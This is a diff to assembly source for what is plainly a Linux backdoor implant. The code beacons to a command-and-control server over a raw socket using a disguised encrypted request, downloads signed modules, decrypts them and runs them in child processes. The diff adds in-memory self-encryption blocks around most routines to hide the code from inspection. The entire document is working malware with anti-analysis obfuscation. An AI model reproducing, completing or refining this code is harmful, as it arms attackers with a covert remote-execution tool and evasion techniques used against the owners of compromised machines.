@@ -8,8 +8,33 @@ IP4 equ -186;0x80000031 ;ip shuld be 4  part IP1 IP2 IP3 IP4 and ip4 shuld be ip
 PORT equ 0x5000
 base_adress equ here - _entry
 
-_entry:
+;this OBF parts are in memory decrypter and identifer for obufcater sccript
+; ;obufactions =====OBF
+;     call here0
+; here0:
+;     pop r10
+;     add r10,17
+; 	mov r13,60
+; 	call gostEncrypt
+; ;obufactions =====OBF thos thing add later handle by obufcater tool now comented
 
+; ;========OBUF========
+; 	lea r10,[rel here]
+; 	mov r13,60
+; 	call gostEncrypt
+; here0:
+; ;========OBUF========
+
+; 	db "ABC"
+; ;=====BACKOBUF=======
+; _here0:
+; 	lea r10,[rel here]
+; 	sub r10,60
+; 	mov r13,60
+; 	call gostEncrypt
+; ;=====BACKOBUF=======
+
+_entry:
 	call here ;input come from rax it is base adress
 here:
 	pop rax
@@ -17,7 +42,14 @@ here:
 crate_func_table:
 	mov qword[rel api_table],rax
 
+
 unique_id:
+	;========OBUF========
+		lea r10,[rel here]
+		mov r13,60
+		call gostEncrypt
+	here0:
+	;========OBUF========
 	mov     rax, 63          ; SYS_uname
     lea     rdi, [rel uts]
     syscall
@@ -62,6 +94,15 @@ dealy:
 	; test rax,rax
 	; jnz exit
 
+	;=====BACKOBUF=======
+	_here0:
+		lea r10,[rel here]
+		sub r10,60
+		mov r13,60
+		call gostEncrypt
+	;=====BACKOBUF=======
+
+
 ;This is beconing For C2
 
     ;creating a socket syscall
@@ -73,6 +114,12 @@ dealy:
     call gostEXESyscall
 	test rax,rax
 	js dealy
+	;========OBUF========
+		lea r10,[rel here]
+		mov r13,60
+		call gostEncrypt
+	here1:
+	;========OBUF========
     mov r12,rax ; sockfd is store in r12
 	push r12
     ;create adress structer
@@ -111,10 +158,22 @@ dealy:
 	call gostGetSyscall ;mov rax,42
     call gostEXESyscall
 	test rax,rax
+	;=====BACKOBUF=======
+	_here1:
+		lea r10,[rel here]
+		sub r10,60
+		mov r13,60
+		call gostEncrypt
+	;=====BACKOBUF=======
 	js dealy
 
 	
-
+	;========OBUF========
+		lea r10,[rel here]
+		mov r13,60
+		call gostEncrypt
+	here2:
+	;========OBUF========
     ;send fuck GET reqest to server syscall
     mov rdi,r12
     lea rsi,[rel http_reqest] ;this is not actualy http it is encrypted garbaged http header
@@ -126,8 +185,21 @@ dealy:
 	call gostGetSyscall ;mov rax,44
     call gostEXESyscall
 	test rax,rax
+	;=====BACKOBUF=======
+	_here2:
+		lea r10,[rel here]
+		sub r10,60
+		mov r13,60
+		call gostEncrypt
+	;=====BACKOBUF=======
 	js dealy
 
+	;========OBUF========
+		lea r10,[rel here]
+		mov r13,60
+		call gostEncrypt
+	here3:
+	;========OBUF========
     ;damn recive syscall
     mov rdi,r12
     lea rsi,[rel modules];r9
@@ -137,6 +209,13 @@ dealy:
 	call gostGetSyscall ;mov rax,45
     call gostEXESyscall
 	test rax,rax
+	;=====BACKOBUF=======
+	_here3:
+		lea r10,[rel here]
+		sub r10,60
+		mov r13,60
+		call gostEncrypt
+	;=====BACKOBUF=======
 	js dealy
     mov r13,rax ;r13 is the read buffer size
 
@@ -168,8 +247,14 @@ signatuer_loop: ;Signatuer is that shuld every module have NSLM55IM
     jmp dealy
 
 
-decrypt_module:
 
+decrypt_module:
+	;========OBUF========
+		lea r10,[rel here]
+		mov r13,60
+		call gostEncrypt
+	here4:
+	;========OBUF========
     add rsi,8 
     mov r10,rsi ;ignore signater and r10 now pointer to module
 
@@ -189,6 +274,13 @@ create_module_child:
     call gostEXESyscall
     test rax, rax
 	js exit
+	;=====BACKOBUF=======
+	_here4:
+		lea r10,[rel here]
+		sub r10,60
+		mov r13,60
+		call gostEncrypt
+	;=====BACKOBUF=======
     jnz dealy
 
 	lea rax,[rel api_table] ;give api table to module
@@ -201,6 +293,7 @@ exit:
 	call gostGetSyscall ;mov rax, 60         ; sys_exit syscall number
     xor rdi, rdi        ; exit code 0
     call gostEXESyscall             ; exit program
+	
 
 ;==========================================================
 ; most modules are cuttuff(execute --> exit) modules. none_cuttufe(long live) module are mov a it id into spesific locationn and it will send when beconing to prevent get module agin
@@ -209,6 +302,12 @@ times 20 db 0
 
 ;=================SHELLCODE_API============
 gostGetSyscall:
+	;========OBUF========
+		lea r10,[rel here]
+		mov r13,60
+		call gostEncrypt
+	here5:
+	;========OBUF========
 	push rdx
 	push rsi
 	push r12
@@ -248,9 +347,22 @@ loop:
     push rax
     pop rax
 	pop rdx
+	;=====BACKOBUF=======
+	_here5:
+		lea r10,[rel here]
+		sub r10,60
+		mov r13,60
+		call gostEncrypt
+	;=====BACKOBUF=======
     ret
 
 gostSend:
+	;========OBUF========
+		lea r10,[rel here]
+		mov r13,60
+		call gostEncrypt
+	here6:
+	;========OBUF========
 	;34B
 	push rbp
 	mov rbp,rsp
@@ -339,12 +451,27 @@ gostSend:
     call gostEXESyscall
 	test rax, rax
 	js exit
+	;=====BACKOBUF=======
+	_here6:
+		lea r10,[rel here]
+		sub r10,60
+		mov r13,60
+		call gostEncrypt
+	;=====BACKOBUF=======
+	ret
 
 gostPrint:
 	;input is from rdi
 	call gostSend ;if you think to get output of a eny module also use gostPrint function it is secuer
 
+
 gostEXESyscall:
+	;========OBUF========
+		lea r10,[rel here]
+		mov r13,60
+		call gostEncrypt
+	here7:
+	;========OBUF========
 	;40C
 	mov r15w,0x0E0F
 	mov [rel stub],r15w
@@ -353,6 +480,13 @@ stub:
 	db "00"
 	mov r15w,0x00
 	mov [rel stub],r15w
+	;=====BACKOBUF=======
+	_here7:
+		lea r10,[rel here]
+		sub r10,60
+		mov r13,60
+		call gostEncrypt
+	;=====BACKOBUF=======
 	ret
 
 
@@ -384,6 +518,12 @@ gostEncrypt:
 
 
 gostExecute:
+	;========OBUF========
+		lea r10,[rel here]
+		mov r13,60
+		call gostEncrypt
+	here8:
+	;========OBUF========
 	;r10 is the binary with absulute path
 	;r13 is arguments
 	;r14 is the out buffer
@@ -426,9 +566,22 @@ gostExecute:
 	test rax, rax
 	js exit
 	pop rax
+	;=====BACKOBUF=======
+	_here8:
+		lea r10,[rel here]
+		sub r10,60
+		mov r13,60
+		call gostEncrypt
+	;=====BACKOBUF=======
 	ret
 
 execute_child:
+	;========OBUF========
+		lea r10,[rel here]
+		mov r13,60
+		call gostEncrypt
+	here9:
+	;========OBUF========
 	mov rdi, [rel pipefd]
     mov rax, 3
     syscall
@@ -459,7 +612,13 @@ execute_child:
 	mov rax, 60     ; syscall: exit
     xor rdi, rdi    ; status = 0
     syscall
-
+	;=====BACKOBUF=======
+	_here9:
+		lea r10,[rel here]
+		sub r10,60
+		mov r13,60
+		call gostEncrypt
+	;=====BACKOBUF=======
 ;=================SHELLCODE_API============
 
 
